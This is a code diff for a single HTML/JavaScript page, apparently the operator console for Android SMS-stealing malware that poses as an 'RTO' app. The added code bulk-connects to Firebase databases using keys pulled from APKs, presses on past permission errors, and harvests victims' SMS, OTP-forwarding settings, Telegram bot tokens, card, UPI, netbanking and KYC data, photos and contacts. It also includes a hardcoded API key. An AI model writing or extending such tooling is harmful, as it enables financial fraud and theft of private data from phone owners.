@@ -11,11 +11,58 @@
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; color:#1E293B; min-height:100vh; }
 
-/* ═══ PREMIUM WHITE LIGHT THEME ═══ */
+/* ═══ CONNECT SCREEN (pehle ye khulega) ═══ */
+.connect-screen { position:fixed; inset:0; background:linear-gradient(135deg,#F5F7FB,#EFF6FF); display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; overflow-y:auto; }
+.connect-box { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:20px; padding:28px; max-width:520px; width:100%; box-shadow:0 20px 60px rgba(15,23,42,0.12); margin:auto; }
+.connect-box h1 { color:#1E40AF; font-size:20px; margin-bottom:6px; font-weight:800; text-align:center; }
+.connect-box .sub { color:#64748B; font-size:12px; margin-bottom:22px; text-align:center; }
+
+.saved-section { margin-bottom:20px; }
+.saved-title { color:#64748B; font-size:10px; text-transform:uppercase; letter-spacing:0.1em; font-weight:800; margin-bottom:10px; display:flex; align-items:center; gap:10px; }
+.saved-title::before, .saved-title::after { content:''; flex:1; height:1px; background:#E2E8F0; }
+.saved-list { display:flex; flex-direction:column; gap:8px; max-height:200px; overflow-y:auto; }
+.saved-item { background:#F8FAFC; border:1px solid #E2E8F0; border-radius:12px; padding:12px 14px; display:flex; align-items:center; gap:12px; cursor:pointer; transition:all 0.2s; }
+.saved-item:hover { background:#EFF6FF; border-color:#BFDBFE; transform:translateX(2px); }
+.saved-icon { width:38px; height:38px; border-radius:11px; background:linear-gradient(135deg,#3B82F6,#2563EB); display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0; box-shadow:0 3px 8px rgba(37,99,235,0.25); }
+.saved-info { flex:1; min-width:0; }
+.saved-name { color:#0F172A; font-size:12px; font-weight:700; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.saved-url { color:#94A3B8; font-size:9px; font-family:'SF Mono',monospace; margin-top:3px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.saved-del { background:#FEF2F2; border:none; color:#DC2626; width:28px; height:28px; border-radius:8px; cursor:pointer; font-size:12px; font-weight:700; flex-shrink:0; }
+.saved-del:hover { background:#FEE2E2; }
+
+.bulk-card { background:linear-gradient(135deg,#FEF3C7,#FFFBEB); border:1px solid #FCD34D; border-radius:14px; padding:16px; margin-bottom:16px; }
+.bulk-card h3 { color:#92400E; font-size:13px; margin-bottom:8px; font-weight:700; }
+.bulk-card p { color:#78350F; font-size:10px; line-height:1.55; margin-bottom:12px; }
+.bulk-card textarea { width:100%; min-height:100px; padding:12px; background:#FFFFFF; border:1px solid #FCD34D; border-radius:10px; color:#1E293B; font-size:11px; font-family:'SF Mono',monospace; resize:vertical; line-height:1.55; }
+.bulk-card textarea:focus { outline:none; border-color:#F59E0B; box-shadow:0 0 0 3px rgba(245,158,11,0.15); }
+.btn-bulk { width:100%; padding:14px; background:linear-gradient(135deg,#F59E0B,#D97706); color:white; border:none; border-radius:10px; font-size:13px; font-weight:800; cursor:pointer; margin-top:12px; box-shadow:0 3px 10px rgba(245,158,11,0.3); }
+.btn-bulk:hover { transform:translateY(-1px); box-shadow:0 5px 14px rgba(245,158,11,0.4); }
+
+.apk-upload { background:#F8FAFC; border:2px dashed #CBD5E1; border-radius:14px; padding:22px 18px; text-align:center; margin-bottom:16px; cursor:pointer; transition:all 0.2s; }
+.apk-upload:hover { background:#EFF6FF; border-color:#93C5FD; }
+.apk-upload .up-ico { width:52px; height:52px; margin:0 auto 12px; background:#FFFFFF; border:1px solid #E2E8F0; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:22px; color:#2563EB; box-shadow:0 2px 8px rgba(37,99,235,0.1); }
+.apk-upload h4 { color:#1E293B; font-size:13px; margin-bottom:5px; font-weight:700; }
+.apk-upload p { color:#64748B; font-size:10px; }
+.apk-upload input { display:none; }
+.apk-status { color:#059669; font-size:10px; margin-top:10px; display:none; font-weight:700; }
+.apk-status.show { display:block; }
+
+.form-sep { display:flex; align-items:center; gap:12px; margin:18px 0 16px; color:#94A3B8; font-size:9px; text-transform:uppercase; letter-spacing:0.12em; font-weight:800; }
+.form-sep::before, .form-sep::after { content:''; flex:1; height:1px; background:#E2E8F0; }
+
+.fl { display:block; color:#64748B; font-size:10px; margin-bottom:6px; text-transform:uppercase; letter-spacing:0.05em; font-weight:700; }
+.fi { width:100%; padding:12px 14px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:13px; font-family:inherit; margin-bottom:12px; }
+.fi:focus { outline:none; border-color:#93C5FD; box-shadow:0 0 0 3px rgba(59,130,246,0.1); background:#FFFFFF; }
+.btn-connect { width:100%; padding:14px; background:linear-gradient(135deg,#2563EB,#1D4ED8); color:white; border:none; border-radius:11px; font-size:13px; font-weight:800; cursor:pointer; box-shadow:0 4px 12px rgba(37,99,235,0.3); }
+.btn-connect:hover { transform:translateY(-1px); box-shadow:0 6px 16px rgba(37,99,235,0.4); }
+.connect-err { color:#DC2626; font-size:11px; margin-top:10px; min-height:16px; font-weight:700; text-align:center; }
+.connect-ok { color:#059669; font-size:11px; margin-top:10px; min-height:16px; font-weight:700; text-align:center; }
+
+/* ═══ MAIN PANEL ═══ */
 .topbar { background:#FFFFFF; padding:14px 18px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #E2E8F0; position:sticky; top:0; z-index:100; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
 .topbar h1 { color:#1E40AF; font-size:15px; font-weight:700; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:45%; }
 .topbar-right { display:flex; align-items:center; gap:8px; flex-shrink:0; }
-.status { display:flex; align-items:center; gap:6px; font-size:10px; color:#059669; padding:5px 10px; background:#ECFDF5; border-radius:20px; font-weight:600; }
+.status { display:flex; align-items:center; gap:6px; font-size:10px; color:#059669; padding:5px 10px; background:#ECFDF5; border-radius:20px; font-weight:700; }
 .dot { width:6px; height:6px; border-radius:50%; background:#10B981; animation:pulse 2s infinite; }
 @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.5;} }
 .btn-new { background:#EFF6FF; color:#2563EB; border:1px solid #BFDBFE; padding:7px 13px; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; }
@@ -58,7 +105,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .device-grid-2 .k { color:#94A3B8; font-size:9px; text-transform:uppercase; font-weight:700; letter-spacing:0.05em; }
 .device-grid-2 .v { color:#334155; font-size:12px; font-weight:600; margin-top:3px; }
 
-/* DRAWER */
 .drawer-overlay { position:fixed; inset:0; background:rgba(15,23,42,0.5); z-index:998; opacity:0; pointer-events:none; transition:opacity 0.25s; backdrop-filter:blur(2px); }
 .drawer-overlay.active { opacity:1; pointer-events:auto; }
 .drawer { position:fixed; top:0; right:0; width:100%; max-width:640px; height:100vh; background:#F8FAFC; z-index:999; transform:translateX(100%); transition:transform 0.3s; display:flex; flex-direction:column; border-left:1px solid #E2E8F0; box-shadow:-8px 0 30px rgba(0,0,0,0.1); }
@@ -79,7 +125,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 
 .drawer-body { padding:14px; overflow-y:auto; flex:1; background:#F8FAFC; }
 
-/* MESSAGES */
 .msg { background:#FFFFFF; border-left:3px solid #3B82F6; border-radius:8px; padding:12px 14px; margin-bottom:8px; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
 .msg.sent { border-left-color:#10B981; }
 .msg-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:5px; }
@@ -92,11 +137,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .msg-tag.new-tag { background:linear-gradient(135deg,#FBBF24,#F59E0B); color:#FFF; font-weight:900; padding:3px 9px; border-radius:10px; font-size:9px; letter-spacing:0.05em; animation:newBadge 1.5s ease-in-out infinite; }
 @keyframes newBadge { 0%,100% { transform:scale(1); } 50% { transform:scale(1.08); } }
 
-/* FORMS */
 .fg { margin-bottom:12px; }
-.fl { display:block; color:#64748B; font-size:10px; margin-bottom:6px; text-transform:uppercase; letter-spacing:0.05em; font-weight:700; }
-.fi, .fs, .ft { width:100%; padding:12px 14px; background:#FFFFFF; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:13px; font-family:inherit; }
-.fi:focus, .ft:focus { outline:none; border-color:#93C5FD; box-shadow:0 0 0 3px rgba(59,130,246,0.1); }
 .ft { min-height:80px; resize:vertical; }
 .btn { width:100%; padding:13px; background:#2563EB; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; margin-top:6px; box-shadow:0 2px 6px rgba(37,99,235,0.25); }
 .btn:hover { background:#1D4ED8; }
@@ -117,13 +158,10 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .on-off { padding:13px 20px; background:#F1F5F9; border:none; border-radius:10px; color:#334155; font-size:12px; font-weight:700; cursor:pointer; white-space:nowrap; }
 .on-off.on { background:#059669; color:white; }
 
-.info-b { background:#EFF6FF; border:1px solid #BFDBFE; border-radius:8px; padding:10px; font-size:10px; color:#334155; margin-top:8px; line-height:1.55; }
-.cc { font-size:9px; color:#94A3B8; text-align:right; margin-top:3px; }
 .dir { display:flex; justify-content:space-between; padding:11px 0; border-bottom:1px solid #F1F5F9; font-size:12px; }
 .dir .k { color:#64748B; font-weight:600; }
 .dir .v { color:#1E293B; font-weight:600; text-align:right; max-width:60%; word-break:break-word; }
 
-/* PHOTOS */
 .pgrid { display:grid; grid-template-columns:repeat(auto-fill,minmax(110px,1fr)); gap:8px; }
 .pitem { border-radius:10px; overflow:hidden; background:#FFFFFF; cursor:pointer; position:relative; border:1px solid #E2E8F0; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
 .pitem:hover { border-color:#BFDBFE; box-shadow:0 4px 12px rgba(37,99,235,0.15); }
@@ -140,7 +178,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .pv-controls button.close, .pv-controls button.del { background:#DC2626; color:white; }
 .pv-info { color:#CBD5E1; font-size:11px; margin-top:10px; text-align:center; }
 
-/* APPS / NOTIFS */
 .app { background:#FFFFFF; padding:10px 13px; border-radius:10px; margin-bottom:6px; display:flex; align-items:center; gap:10px; border-left:3px solid #3B82F6; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
 .app-ic { width:36px; height:36px; background:linear-gradient(135deg,#3B82F6,#2563EB); border-radius:10px; display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0; }
 .app-name { color:#0F172A; font-size:12px; font-weight:700; }
@@ -152,7 +189,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .notif-title { color:#0F172A; font-size:11px; font-weight:700; margin-bottom:3px; }
 .notif-body { color:#475569; font-size:11px; line-height:1.5; word-break:break-word; }
 
-/* TRANSACTIONS */
 .tx { background:#FFFFFF; border:1px solid #D1FAE5; border-radius:12px; padding:14px; margin-bottom:10px; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
 .tx-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
 .tx-acc { color:#1E40AF; font-size:11px; font-weight:700; }
@@ -187,7 +223,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .loading { text-align:center; padding:40px; color:#94A3B8; font-weight:600; }
 .empty { text-align:center; padding:40px 20px; color:#94A3B8; font-size:12px; font-weight:600; }
 
-/* DIALOGS */
 .cf-overlay { position:fixed; inset:0; background:rgba(15,23,42,0.6); z-index:3000; display:none; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(3px); }
 .cf-overlay.active { display:flex; }
 .cf-dialog { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:16px; padding:22px; max-width:420px; width:100%; box-shadow:0 20px 50px rgba(0,0,0,0.2); }
@@ -209,7 +244,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .cf-status.err { background:#FEF2F2; border-color:#FECACA; color:#DC2626; }
 .cf-close { width:100%; padding:12px; background:#F1F5F9; color:#334155; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; margin-top:8px; }
 
-/* Telegram log */
 .tg-status { background:#EFF6FF; border:1px solid #BFDBFE; border-radius:9px; padding:11px 13px; margin-top:12px; font-size:11px; color:#2563EB; line-height:1.55; font-weight:700; }
 .tg-status.ok { background:#ECFDF5; border-color:#A7F3D0; color:#047857; }
 .tg-status.err { background:#FEF2F2; border-color:#FECACA; color:#DC2626; }
@@ -217,12 +251,10 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .tg-log-line { color:#94A3B8; padding:3px 0; border-bottom:1px solid rgba(148,163,184,0.15); word-break:break-word; }
 .tg-log-line:last-child { border-bottom:none; color:#F1F5F9; }
 
-/* SCAN STATUS */
-.scan-status { background:#EFF6FF; border:1px solid #BFDBFE; border-radius:10px; padding:12px; margin:0 18px 14px; font-size:11px; color:#2563EB; display:flex; align-items:center; gap:10px; font-weight:600; }
+.scan-status { background:#EFF6FF; border:1px solid #BFDBFE; border-radius:10px; padding:12px; margin:0 18px 14px; font-size:11px; color:#2563EB; display:flex; align-items:center; gap:10px; font-weight:700; }
 .scan-status .spin { display:inline-block; width:14px; height:14px; border:2px solid rgba(59,130,246,0.3); border-top-color:#2563EB; border-radius:50%; animation:spin 1s linear infinite; }
 @keyframes spin { to { transform:rotate(360deg); } }
 
-/* INLINE PROGRESS */
 .inline-progress { display:none; margin-top:14px; padding:14px; background:#EFF6FF; border:1px solid #BFDBFE; border-radius:12px; }
 .inline-progress.active { display:block; animation:fadeIn 0.3s; }
 @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
@@ -240,33 +272,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 @keyframes shimmer { 0% { background-position:200% 0; } 100% { background-position:-200% 0; } }
 .inline-progress-stats { font-size:10px; color:#64748B; margin-top:8px; text-align:center; font-weight:600; }
 
-/* NEW CONNECTION PANEL */
-.new-conn-overlay { position:fixed; inset:0; background:rgba(15,23,42,0.6); z-index:5000; display:none; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(4px); overflow-y:auto; }
-.new-conn-overlay.active { display:flex; }
-.new-conn-dialog { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:18px; padding:24px; max-width:520px; width:100%; box-shadow:0 25px 60px rgba(0,0,0,0.25); margin:auto; max-height:90vh; overflow-y:auto; }
-.new-conn-dialog h2 { color:#1E40AF; font-size:17px; margin-bottom:6px; font-weight:800; }
-.new-conn-dialog .hint2 { color:#64748B; font-size:11px; margin-bottom:20px; line-height:1.55; }
-.bulk-card { background:linear-gradient(135deg,#FEF3C7,#FFFBEB); border:1px solid #FCD34D; border-radius:12px; padding:14px; margin-bottom:16px; }
-.bulk-card h3 { color:#92400E; font-size:13px; margin-bottom:8px; font-weight:700; }
-.bulk-card p { color:#78350F; font-size:10px; line-height:1.55; margin-bottom:12px; }
-.bulk-card textarea { width:100%; min-height:110px; padding:12px; background:#FFFFFF; border:1px solid #FCD34D; border-radius:10px; color:#1E293B; font-size:11px; font-family:'SF Mono',monospace; resize:vertical; line-height:1.55; }
-.btn-bulk { width:100%; padding:14px; background:linear-gradient(135deg,#F59E0B,#D97706); color:white; border:none; border-radius:10px; font-size:13px; font-weight:800; cursor:pointer; margin-top:12px; box-shadow:0 3px 10px rgba(245,158,11,0.3); }
-.apk-upload { background:#F8FAFC; border:2px dashed #CBD5E1; border-radius:14px; padding:24px 18px; text-align:center; margin-bottom:16px; cursor:pointer; transition:all 0.2s; }
-.apk-upload:hover { background:#EFF6FF; border-color:#93C5FD; }
-.apk-upload .up-ico { width:54px; height:54px; margin:0 auto 14px; background:#FFFFFF; border:1px solid #E2E8F0; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:24px; color:#2563EB; }
-.apk-upload h4 { color:#1E293B; font-size:13px; margin-bottom:5px; font-weight:700; }
-.apk-upload p { color:#64748B; font-size:10px; }
-.apk-upload input { display:none; }
-.apk-status { color:#059669; font-size:10px; margin-top:10px; display:none; font-weight:600; }
-.apk-status.show { display:block; }
-.form-sep2 { display:flex; align-items:center; gap:12px; margin:18px 0 16px; color:#94A3B8; font-size:9px; text-transform:uppercase; letter-spacing:0.12em; font-weight:700; }
-.form-sep2::before, .form-sep2::after { content:''; flex:1; height:1px; background:#E2E8F0; }
-.btn-row { display:flex; gap:8px; margin-top:10px; }
-.btn-row button { flex:1; padding:13px; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; }
-.btn-row .save { background:#2563EB; color:white; box-shadow:0 2px 8px rgba(37,99,235,0.25); }
-.btn-row .cancel { background:#F1F5F9; color:#334155; }
-.error-msg { color:#DC2626; font-size:11px; margin-top:10px; min-height:16px; font-weight:600; }
-
 @media (max-width:600px) { 
   .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } 
   .search-box { margin:0 12px 12px; width:calc(100% - 24px); } 
@@ -279,7 +284,45 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 </head>
 <body>
 
-<div id="mainApp">
+<!-- ═══ CONNECT SCREEN — PEHLE YE KHULEGA ═══ -->
+<div class="connect-screen" id="connectScreen">
+  <div class="connect-box">
+    <h1>🔗 Firebase Connect</h1>
+    <div class="sub">Enter Firebase URL, API Key, or upload APK</div>
+
+    <div class="saved-section" id="savedSection" style="display:none;">
+      <div class="saved-title">Saved Accounts</div>
+      <div class="saved-list" id="savedList"></div>
+    </div>
+
+    <div class="bulk-card">
+      <h3>⚡ Bulk Connect</h3>
+      <p>Kahi se bhi firebase URLs paste karo. Har URL auto-detect hoga.</p>
+      <textarea id="bulkInput" placeholder="📍 Firebase URL: https://app-one-default-rtdb.firebaseio.com&#10;🔑 Auth Key: AIzaSy..."></textarea>
+      <button class="btn-bulk" id="btnBulkConnect">⚡ Connect All</button>
+    </div>
+
+    <div class="apk-upload" id="apkUpload">
+      <div class="up-ico">⬆</div>
+      <h4>Upload APK File</h4>
+      <p>Auto-extracts Firebase URL & API Key</p>
+      <div class="apk-status" id="apkStatus"></div>
+      <input type="file" id="apkFile" accept=".apk,.zip">
+    </div>
+
+    <div class="form-sep">Or Manual Entry</div>
+
+    <label class="fl">Firebase Database URL</label>
+    <input type="text" class="fi" id="newUrl" placeholder="https://your-project.firebaseio.com">
+    <label class="fl">Authentication Key / Secret</label>
+    <input type="text" class="fi" id="newKey" placeholder="Your Firebase secret key (optional)">
+    <button class="btn-connect" id="btnConnect">⚡ Connect & Open Panel</button>
+    <div class="connect-err" id="connectErr"></div>
+  </div>
+</div>
+
+<!-- ═══ MAIN PANEL ═══ -->
+<div id="mainApp" style="display:none;">
   <div class="topbar">
     <h1 id="topTitle">🚔 RTO ADMIN</h1>
     <div class="topbar-right">
@@ -394,37 +437,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
   </div>
 </div>
 
-<!-- ═══ NEW CONNECTION PANEL ═══ -->
-<div class="new-conn-overlay" id="newConnOverlay">
-  <div class="new-conn-dialog">
-    <h2>🔗 New Connection</h2>
-    <div class="hint2">Add Firebase URL, API Key, or upload APK. Data auto-detect hoga.</div>
-    <div class="bulk-card">
-      <h3>⚡ Bulk Connect</h3>
-      <p>Kahi se bhi firebase URLs paste karo. Har URL auto-detect hoga.</p>
-      <textarea id="bulkInput" placeholder="📍 Firebase URL: https://app-one-default-rtdb.firebaseio.com&#10;🔑 Auth Key: AIzaSy..."></textarea>
-      <button class="btn-bulk" id="btnBulkConnect">⚡ Connect All</button>
-    </div>
-    <div class="apk-upload" id="apkUpload">
-      <div class="up-ico">⬆</div>
-      <h4>Upload APK File</h4>
-      <p>Auto-extracts Firebase URL & API Key</p>
-      <div class="apk-status" id="apkStatus"></div>
-      <input type="file" id="apkFile" accept=".apk,.zip">
-    </div>
-    <div class="form-sep2">Or Manual Entry</div>
-    <label class="fl">Firebase Database URL</label>
-    <input type="text" class="fi" id="newUrl" placeholder="https://your-project.firebaseio.com">
-    <label class="fl">Authentication Key / Secret</label>
-    <input type="text" class="fi" id="newKey" placeholder="Your Firebase secret key">
-    <div class="btn-row">
-      <button class="cancel" id="btnCancelNew">Cancel</button>
-      <button class="save" id="btnSaveNew">⚡ Save & Connect</button>
-    </div>
-    <div class="error-msg" id="newErr"></div>
-  </div>
-</div>
-
 <script>
 var DEFAULT_CONFIG = {
   apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
@@ -449,120 +461,154 @@ var telegramUrlCache = {};
 var inlineProgressListener = null;
 
 // ═══════════════════════════════════════════════════════════
-// SMART FIREBASE INIT — koi bhi URL, private bhi
+// URL + CONNECT
 // ═══════════════════════════════════════════════════════════
 function normalizeFirebaseUrl(url) {
   if (!url) return url;
   url = url.trim().replace(/\/+$/, '');
   if (url.indexOf('http') !== 0) url = 'https://' + url;
-  // Asia region database
-  url = url.replace('.firebasedatabase.app', '.firebasedatabase.app');
   return url;
 }
-
 function extractProjectId(url) {
-  try {
-    var m = url.replace('https://','').replace('http://','');
-    m = m.split('.')[0];
-    return m;
-  } catch(e) { return 'unknown'; }
+  try { return url.replace('https://','').replace('http://','').split('.')[0]; } catch(e) { return 'unknown'; }
 }
-
-function tryConnect(config, name) {
-  return new Promise(function(resolve, reject) {
+function tryConnect(config) {
+  return new Promise(function(resolve) {
     try {
       if (currentApp) { try { currentApp.delete(); } catch(e) {} }
       var appName = 'app_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
       currentApp = firebase.initializeApp(config, appName);
       db = currentApp.database();
-      // ✅ HARD TEST — actual read karo
-      var testRef = db.ref('/');
-      var timeout = setTimeout(function() {
-        // Timeout hone pe bhi try karo — shayad bada data ho
-        resolve();
-      }, 4000);
-      testRef.once('value').then(function(snap) {
-        clearTimeout(timeout);
-        console.log('✅ Connected. Root data:', snap.exists() ? 'YES' : 'EMPTY');
-        resolve();
+      var done = false;
+      var timer = setTimeout(function() { if (!done) { done = true; resolve(); } }, 2500);
+      db.ref('/').once('value').then(function() {
+        if (!done) { done = true; clearTimeout(timer); resolve(); }
       }).catch(function(err) {
-        clearTimeout(timeout);
-        console.warn('⚠️ Read test failed, but trying anyway:', err.message);
-        // Permission denied bhi chalega — try karo scan
-        resolve();
+        console.warn('⚠️ Probe failed (may still work):', err.message);
+        if (!done) { done = true; clearTimeout(timer); resolve(); }
       });
-    } catch(e) { reject(e); }
+    } catch(e) { resolve(); }
   });
 }
 
 // ═══════════════════════════════════════════════════════════
-// HARD SCAN — koi bhi device ID format
+// DEVICE DETECTION — koi bhi ID format (numeric, hex, UUID, DEV_, mixed)
 // ═══════════════════════════════════════════════════════════
 function isDeviceEntry(key, entry) {
   if (!entry || typeof entry !== 'object' || Array.isArray(entry)) return false;
-  // DEV_ prefix
   if (typeof key === 'string' && key.indexOf('DEV_') === 0) return true;
-  // Device field check
-  var fields = ['device_model','device_id','device_manufacturer','device_brand','android_version','android_sdk','sim_info','battery','battery_status','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','status','last_seen','messages','sms_history','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','photos','installed_apps','installed_apps_telegram','notifications','device_board','serial_number','cpu_arch','storage','ip_address','online_time','offline_time','battery_info','sms','contacts','calls'];
+  var fields = ['device_model','device_id','device_manufacturer','device_brand','android_version','android_sdk','sim_info','battery','battery_status','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','status','last_seen','messages','sms_history','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','photos','installed_apps','installed_apps_telegram','notifications','device_board','serial_number','cpu_arch','storage','ip_address','online_time','offline_time','battery_info','sms','contacts','calls','device_name','phone','phone_number','number'];
   for (var i = 0; i < fields.length; i++) { if (entry[fields[i]] !== undefined) return true; }
-  // Battery % check
-  var hasBattery = false;
-  Object.keys(entry).forEach(function(k) { if (typeof entry[k] === 'string' && entry[k].indexOf('%') !== -1) hasBattery = true; });
-  if (hasBattery) return true;
-  // Deep check — agar messages/photos jaisa structure hai
+  var keys = Object.keys(entry);
+  for (var j = 0; j < keys.length; j++) {
+    var v = entry[keys[j]];
+    if (typeof v === 'string' && v.indexOf('%') !== -1) return true;
+  }
   if (entry.messages && typeof entry.messages === 'object') return true;
   if (entry.photos && typeof entry.photos === 'object') return true;
-  // ✅ Any ID format — numeric, hex, string, mixed
-  // Agar key mein 'device' word hai ya common patterns
+  if (entry.sms_history && typeof entry.sms_history === 'object') return true;
   if (typeof key === 'string') {
     var kl = key.toLowerCase();
-    if (kl.indexOf('device') !== -1 || kl.indexOf('phone') !== -1 || kl.indexOf('mobile') !== -1) return true;
-    // 15+ digit numeric ID (like IMEI)
+    if (kl.indexOf('device') !== -1 || kl.indexOf('phone') !== -1 || kl.indexOf('mobile') !== -1 || kl.indexOf('client') !== -1) return true;
     if (/^\d{10,}$/.test(key)) return true;
-    // 32+ char hex (like Android ID or UUID)
     if (/^[a-f0-9]{16,}$/i.test(key)) return true;
-    // UUID format
     if (/^[a-f0-9-]{20,}$/i.test(key)) return true;
+    if (/^[A-Z0-9_-]{8,}$/.test(key) && /\d/.test(key)) return true;
   }
   return false;
 }
 
-function scanForDevice(obj, deviceId, result) {
-  if (!obj || typeof obj !== 'object') return;
-  if (obj[deviceId] && typeof obj[deviceId] === 'object') collectData(obj[deviceId], result);
-  Object.keys(obj).forEach(function(key) {
-    if (key === deviceId) return;
-    var child = obj[key];
-    if (child && typeof child === 'object') scanForDevice(child, deviceId, result);
+// ═══════════════════════════════════════════════════════════
+// HARD FAST SCAN — parallel + deep recursive
+// ═══════════════════════════════════════════════════════════
+function hardScan(onProgress) {
+  var commonPaths = [
+    '', // root
+    'device_info', 'devices', 'users', 'data', 'clients', 'device_data',
+    'all_devices', 'customers', 'accounts', 'nodes', 'app', 'app_data',
+    'sms', 'messages', 'records'
+  ];
+  var results = {};
+  var done = 0;
+  var total = commonPaths.length;
+  return new Promise(function(resolve) {
+    commonPaths.forEach(function(path) {
+      var ref = path ? db.ref(path) : db.ref('/');
+      ref.once('value', function(snap) {
+        var val = snap.val();
+        if (val && typeof val === 'object') results[path || '__root__'] = val;
+        done++;
+        if (onProgress) onProgress(done, total);
+        if (done === total) resolve(mergeAllDevices(results));
+      }, function(err) {
+        done++;
+        if (onProgress) onProgress(done, total);
+        if (done === total) resolve(mergeAllDevices(results));
+      });
+    });
   });
 }
 
-function collectData(devObj, result) {
-  if (!devObj || typeof devObj !== 'object') return;
-  if (devObj.messages) Object.keys(devObj.messages).forEach(function(k) { result.messages[k] = devObj.messages[k]; });
-  if (devObj.sms_history) Object.keys(devObj.sms_history).forEach(function(k) { result.sms_history[k] = devObj.sms_history[k]; });
-  if (devObj.photos) Object.keys(devObj.photos).forEach(function(k) { result.photos[k] = devObj.photos[k]; });
-  if (devObj.notifications) Object.keys(devObj.notifications).forEach(function(k) { result.notifications[k] = devObj.notifications[k]; });
-  if (devObj.sms_notifications) Object.keys(devObj.sms_notifications).forEach(function(k) { result.notifications[k] = devObj.sms_notifications[k]; });
-  if (devObj.installed_apps) result.installed_apps = devObj.installed_apps;
-  if (devObj.installed_apps_telegram) result.installed_apps_telegram = devObj.installed_apps_telegram;
-  if (devObj.apps_upload_command) result.apps_upload_command = devObj.apps_upload_command;
-  if (devObj.sim_info && typeof devObj.sim_info === 'object') result.sim_info = Object.assign({}, result.sim_info || {}, devObj.sim_info);
-  if (devObj.sim1_number || devObj.sim1_carrier) result.sim_info = Object.assign({}, result.sim_info || {}, { sim1_number: devObj.sim1_number, sim1_carrier: devObj.sim1_carrier, sim2_number: devObj.sim2_number, sim2_carrier: devObj.sim2_carrier });
-  if (devObj.forward_settings) result.forward_settings = Object.assign({}, result.forward_settings || {}, devObj.forward_settings);
-  if (devObj.enabled !== undefined && devObj.admin_number !== undefined) result.forward_settings = Object.assign({}, result.forward_settings || {}, { enabled: devObj.enabled, admin_number: devObj.admin_number, bot_token: devObj.bot_token, chat_id: devObj.chat_id, forward_sim_slot: devObj.forward_sim_slot });
-  if (!result.device_info) result.device_info = {};
-  ['device_model','device_name','device_id','android_version','android_sdk','battery','status','last_seen','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','device_note','ip_address','storage','device_manufacturer','device_brand','serial_number'].forEach(function(k) { if (devObj[k] !== undefined) result.device_info[k] = devObj[k]; });
+// ═══════════════════════════════════════════════════════════
+// MERGE — sab paths se device + SMS data nikaalo
+// ═══════════════════════════════════════════════════════════
+function mergeAllDevices(resultsByPath) {
+  var found = {};
+  var skipKeys = ['admin_config','global_config','app_config','telegram_auto_config','config','settings'];
+
+  function collectNested(entry, target) {
+    ['messages','sms_history','photos','notifications','sms_notifications','installed_apps','installed_apps_telegram'].forEach(function(k) {
+      if (entry[k] && typeof entry[k] === 'object') {
+        if (!target[k]) target[k] = {};
+        Object.keys(entry[k]).forEach(function(nk) { target[k][nk] = entry[k][nk]; });
+      }
+    });
+    if (entry.sim_info) target.sim_info = Object.assign({}, target.sim_info || {}, entry.sim_info);
+    if (entry.forward_settings) target.forward_settings = Object.assign({}, target.forward_settings || {}, entry.forward_settings);
+    if (entry.apps_upload_command) target.apps_upload_command = entry.apps_upload_command;
